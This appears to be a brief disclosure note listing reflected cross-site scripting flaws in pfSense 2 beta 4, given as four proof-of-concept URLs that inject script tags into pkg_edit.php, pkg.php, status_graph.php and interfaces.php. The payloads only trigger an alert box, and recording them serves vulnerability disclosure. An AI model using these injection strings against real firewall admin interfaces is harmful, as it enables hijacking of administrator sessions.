So in 2010, pfsense 2 beta 4:

...
xss -> pkg_edit.php
https://10.0.20.220/pkg_edit.php?xml=olsrd.xml&id=%22/%3E%3Cscript%3Ealert%282%29;%3C/script%3E

xss ->  pkg.php
https://10.0.20.220/pkg.php?xml=jailctl.xm%27l%22/%3E%3Cscript%3Ealert%281%29;%3C/script%3E
...

-----------
in pfsense 2 beta 4:
xss  -> status_graph.php

https://10.0.20.220/status_graph.php?if=%22/%3E%3Cscript%3Ealert%281%29;%3C/script%3E

xss -> interfaces.php
https://10.0.20.220/interfaces.php?if=wan%22%22/%3E%3Cscript%3Ealert%281%29;%3C/script%3E
